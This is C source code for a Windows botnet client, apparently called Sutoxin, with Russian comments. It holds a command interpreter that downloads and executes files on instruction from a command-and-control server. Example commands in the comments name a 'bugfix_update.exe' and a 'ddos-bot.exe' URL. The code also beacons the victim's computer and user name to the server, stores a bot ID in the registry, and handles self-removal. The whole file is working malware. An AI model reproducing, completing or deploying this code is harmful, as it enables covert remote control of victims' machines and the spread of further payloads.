// ------------------
//  CommandInterpretator
//  парсер и интерпретатор комманд
// ------------------
DWORD WINAPI CommandInterpretator(char *cmdata, LPVOID lParam)
{
	char *cmd_token[1024], *arg_token[1024];

	char *t = strtok(cmdata, COMMAND_DELIM);
	for(int i = 0; t; t = strtok(NULL, COMMAND_DELIM), i++)
	{
		cmd_token[i] = t;	
	}

	i = -1;
	
	while(TRUE)
	{
		char 			*arg_token[1024], *x;
		i = i + 1;
	
		if(cmd_token[i] == NULL)
			break;

		x = strtok(cmd_token[i], ARGUMENT_DELIM);
		
		for(int j = 0; x; x = strtok(NULL, ARGUMENT_DELIM), j++)
		{
			arg_token[j] = x;
		}

		// "rate#30";
		if(lstrcmp(arg_token[0], "rate")==0)
		{		
			ChangeRate(arg_token[1]);
			break;
		}
		
		
		if(!CheckDTaskById(arg_token[1])) // check task_id
		{
			AddDTaskToDb(arg_token[1]); // add task
			
			// "upd#1192323937813910#http://havephun.org/bugfix_update.exe"
			if(lstrcmp(arg_token[0], "upd")==0)
			{
				if(DownloadAndExecuteFile(arg_token[2], arg_token[1], 2) == TRUE)
				{
					GetCommandViaHTTP(arg_token[1], 2, lParam);
				}	
				else
				{
					DeleteDTaskFromDb(arg_token[1]);
				}
			}
			else
			// "cmd#1192322770432454#exec#0#http://sutoxin/ddos-bot.exe"
			if(lstrcmp(arg_token[0], "cmd")==0)
			{
				if(lstrcmp(arg_token[2], "exec")==0)
				{
					char *m = strtok(arg_token[4], URLS_DELIM);
					for(int y = 0; m; m = strtok(NULL, URLS_DELIM), y++)
					{
						if(DownloadAndExecuteFile(m, arg_token[1], 1) == TRUE)
						{
							GetCommandViaHTTP(arg_token[1], 1, lParam);
							if(lstrcmp(arg_token[3], "1")==0) // delete self
							{
								AddToAutoRun(2);
							}
						} 
						else 
						{
							DeleteDTaskFromDb(arg_token[1]);
						}
					}
				}
			}
			// "cmd#1192322770432454#die"
			else if(lstrcmp(arg_token[0], "cmd")==0)
			{
				if(lstrcmp(arg_token[2], "die")==0)
				{
					AddToAutoRun(2);
				}
			}
		}
		
	}

	return TRUE;
}

// ------------------
//  GetCommandViaHTTP
//  коммуникация с http сервером
// modes:
// 0 - получить команду
// 1 - сообщить о выполнении task
// 2 - сообщшить о выполнении update
// ------------------
DWORD WINAPI GetCommandViaHTTP(char *taskid, int mode, LPVOID lParam)
{
	SUTOXIN_STRUCT sutoxin = *((SUTOXIN_STRUCT *)lParam);
	char *recvbuffer  	=   (char *)GlobalAlloc(GPTR, 1024);
	char *httpdata;
	SOCKET 		 	HTTPsock; 
	SOCKADDR_IN  	HTTPsockin;
	
	HTTPsockin.sin_addr.S_un.S_addr    =   GetIpByHostname(sutoxin.host);
	HTTPsockin.sin_family              =   AF_INET;
	HTTPsockin.sin_port                =   htons((short)CC_PORT);
	HTTPsock                           =   socket(AF_INET, SOCK_STREAM, 0);

	char GetPack[256];

	if(mode == 0)
	{
		// get comp_id & bot_uid
		wsprintf(GetPack, "GET %s?getcmd=1&uid=%s&cn=%s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", 
				sutoxin.path, sutoxin.rnduid, sutoxin.pcname, CC_AGENT, sutoxin.host);
	}
	else
	if(mode == 1)
	{
		wsprintf(GetPack, "GET %s?taskexec=1&task_id=%s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", 
				sutoxin.path, taskid, CC_AGENT, sutoxin.host);
	}		
	else
	if(mode == 2)
	{
		wsprintf(GetPack, "GET %s?updexec=1&update_id=%s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", 
				sutoxin.path, taskid, CC_AGENT, sutoxin.host);
	}		

	int i = connect(HTTPsock, (struct sockaddr *)&HTTPsockin, sizeof(HTTPsockin)); 
		if(i == SOCKET_ERROR) return FALSE;
		
	i = send(HTTPsock, GetPack, lstrlen(GetPack), 0);
		if(i == SOCKET_ERROR) return FALSE;

	if(mode == 1 || mode == 2)
	{
		return TRUE;
	}

	while(i = recv(HTTPsock, recvbuffer, 1024, 0))
	{
		if(i == SOCKET_ERROR) return FALSE;
	}
	
	if(!(recvbuffer[9]=='2')&&(recvbuffer[10]=='0')&&(recvbuffer[11]=='0')) // check "200 OK"
		return FALSE;
		
	for(i = 0; recvbuffer[i]!=0; ++i)
	{
		 if((recvbuffer[i]=='\r')&&(recvbuffer[i+1]=='\n')
			&&(recvbuffer[i+2]=='\r')&&(recvbuffer[i+3]=='\n'))
		{
			httpdata = (char*)&recvbuffer[i] + 4;
			break;
		}
	 }
	
	if(lstrlen(httpdata) < 3)
	{
		closesocket(HTTPsock);
		return FALSE;
	}
	
	closesocket(HTTPsock);
	CommandInterpretator(httpdata, lParam); 
	GlobalFree(recvbuffer);
	
	return TRUE;
}

// ------------------
//  GenerateComputerName
//  сгенерировать имя_компьютера@имя_пользователя
// -------------------
void WINAPI GenerateComputerName(char *lpPcName, char *szRandId)
{
	// Generate PC Name
	char lpszCompName[256], lpszUserName[256];
	DWORD dwSize = 256;	DWORD rnd = 0;
	
	GetComputerName(lpszCompName, &dwSize);
	GetUserName(lpszUserName, &dwSize);
	wsprintf(lpPcName, "%s%s%s", lpszCompName, PC_NAME_DELIM, lpszUserName);

	#define getrandom( min, max, rnd ) (((DWORD)rnd % (int)(((max) + 1) - (min))) + (min))

	__asm
	{
		__emit	0x0f
		__emit  0x31
		mov		rnd,eax
	}

	int RandID = getrandom(rnd, 111111111, 999999999);
	itoa(RandID, szRandId, 10);
}

// ------------------
//  GetUid
//  получить имя компьюетра и уид
// -------------------

void WINAPI GetUid(char *szPcName, char *szRandUid)
{
	HKEY hKey; 
	
	char 	regPcName[256], 	regRandUid[256]; 
	char 	xPcName[256], 		xRandUid[256];
	wsprintf(regPcName, "%s%s", TASKS_PREFIX_Z, TASKS_PCNAME);
	wsprintf(regRandUid, "%s%s", TASKS_PREFIX_Z, TASKS_RAND);

	// read ... 
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TASKS_REG_DATA, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
	}
	
	DWORD dwPcNameLen = sizeof(xPcName); DWORD dwRandUidLen = sizeof(xRandUid);
	if
	(
		RegQueryValueEx(hKey, regPcName, 0,0, (unsigned char*)xPcName, &dwPcNameLen) == ERROR_SUCCESS &&
		RegQueryValueEx(hKey, regRandUid, 0,0, (unsigned char*)xRandUid, &dwRandUidLen) == ERROR_SUCCESS
	)
	{
		lstrcpy(szPcName, xPcName);
		lstrcpy(szRandUid, xRandUid);
	}
	else
	{
		// write
		RegCloseKey(hKey);
		
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TASKS_REG_DATA, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
		{
			lstrcpy(szPcName, 	ERROR_BOTUID);
			lstrcpy(szRandUid, 	ERROR_BOTUID);
			RegCloseKey(hKey);
			return;
		}
		
		char pcname[256], randuid[256];
		GenerateComputerName(pcname, randuid);
		
		RegSetValueExA(hKey, regPcName, NULL, REG_SZ, (const unsigned char *)pcname, lstrlen(pcname));
		RegSetValueExA(hKey, regRandUid, NULL, REG_SZ, (const unsigned char *)randuid, lstrlen(randuid));
		
		RegCloseKey(hKey);

		lstrcpy(szPcName, pcname);
		lstrcpy(szRandUid, randuid);
	}
	
	RegCloseKey(hKey);
	return;
}